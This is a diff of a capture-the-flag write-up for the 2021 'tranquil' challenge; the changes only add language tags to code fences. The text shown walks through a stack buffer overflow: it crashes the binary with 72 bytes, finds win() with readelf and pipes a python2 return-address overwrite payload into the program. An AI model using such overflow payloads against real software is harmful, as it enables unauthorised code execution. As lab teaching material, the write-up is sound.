@@ -10,7 +10,7 @@ Finally, [inner peace](https://files.actf.co/608874e08577f58044bd8dd1551a7b29c69
 
 We have a binary and our C source code:
 
-```
+```c
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -52,7 +52,7 @@ We’re given the password immediately, but it’s clear we need to get to the `
 
 We have a 64 character buffer. If we throw `A * 72` at it, we get a segmentation fault:
 
-```
+```bash
 team8317@actf:/problems/2021/tranquil$ ./tranquil
 Enter the secret word:
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@@ -66,14 +66,14 @@ Now we need to discover where our `win()` function begins and rewrite RIP to poi
 
 We can use `readelf` to find the function:
 
-```
+```bash
 team8317@actf:/problems/2021/tranquil$ readelf -s tranquil | grep win
     41: 0000000000401196   110 FUNC    GLOBAL DEFAULT   14 win
 ```
 
 And now we pass in the location as part of our exploit payload:
 
-```
+```bash
 team8317@actf:/problems/2021/tranquil$ python2 -c "print 'A'*71 + ';\x96\x11\x40'" | ./tranquil
 Enter the secret word:
 Login failed!
